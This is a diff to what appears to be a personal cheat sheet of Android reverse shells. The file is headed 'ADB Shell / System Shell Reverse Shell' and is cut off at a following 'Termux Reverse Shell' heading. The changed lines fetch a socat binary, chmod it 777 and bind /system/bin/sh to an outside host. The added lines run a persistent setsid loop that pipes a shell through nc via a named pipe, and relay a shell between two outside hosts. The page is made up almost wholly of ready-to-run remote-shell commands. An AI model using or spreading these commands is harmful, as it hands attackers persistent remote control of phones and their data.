@@ -1,7 +1,13 @@
 ADB Shell / System Shell Reverse Shell
 ```
-curl https://raw.githubusercontent.com/bnsmb/binaries-for-Android/refs/heads/main/binaries/socat -o /data/local/tmp/socat && chmod 777 /data/local/tmp/socat && /data/local/tmp/socat exec:'/system/bin/sh',pty,stderr,setsid,sigint,sane tcp:gitea.playit.plus:31774
+p="/data/local/tmp/socat"; [ -f "$p" ] || curl -L https://raw.githubusercontent.com/bnsmb/binaries-for-Android/refs/heads/main/binaries/socat -o "$p"; chmod 777 "$p" && "$p" exec:'/system/bin/sh',pty,stderr,setsid,sigint,sane tcp:gitea.playit.plus:31774
 ```
+
+setsid sh -c 'P="/cache/at_pipe"; echo "Starting Loop" > /data/log/++loop_debug.txt; chmod 777 /data/log/++loop_debug.txt; while true; do rm -f "$P"; mkfifo "$P" || echo "Mkfifo Failed" >> /data/log/++loop_debug.txt; chmod 777 "$P"; cat "$P" | /system/bin/sh 2>&1 | nc gitea.playit.plus 31774 > "$P"; echo "Loop Restarting" >> /data/log/++loop_debug.txt; sleep 5; done' &
+
+setsid sh -c 'nc gitea.playit.plus 31774 | /system/bin/sh 2>&1 | nc will-horse.gl.at.ply.gg 51532' &
+
+
 
 Termux Reverse Shell
 ```
